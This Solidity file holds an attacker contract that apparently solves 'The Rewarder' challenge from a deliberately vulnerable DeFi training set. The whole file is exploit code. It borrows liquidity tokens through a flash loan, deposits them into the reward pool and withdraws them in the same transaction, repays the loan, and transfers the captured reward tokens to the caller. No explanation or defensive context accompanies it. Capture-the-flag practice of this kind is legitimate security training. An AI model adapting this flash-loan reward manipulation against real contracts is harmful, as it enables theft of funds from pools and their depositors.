pragma solidity ^0.6.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewarderPoolAttacker {
    address rewarder;

    function attack(address target, address pool, uint256 amount) public {
        rewarder = target;
        FlashLoanerPool(pool).flashLoan(amount);
        TheRewarderPool(target).rewardToken().transfer(msg.sender, TheRewarderPool(target).rewardToken().balanceOf(address(this)));
        delete rewarder;
    }

    function receiveFlashLoan(uint256 amount) public {
        TheRewarderPool(rewarder).liquidityToken().approve(rewarder, amount);
        TheRewarderPool(rewarder).deposit(amount);
        TheRewarderPool(rewarder).withdraw(amount);
        TheRewarderPool(rewarder).liquidityToken().transfer(msg.sender, amount);
    }
}
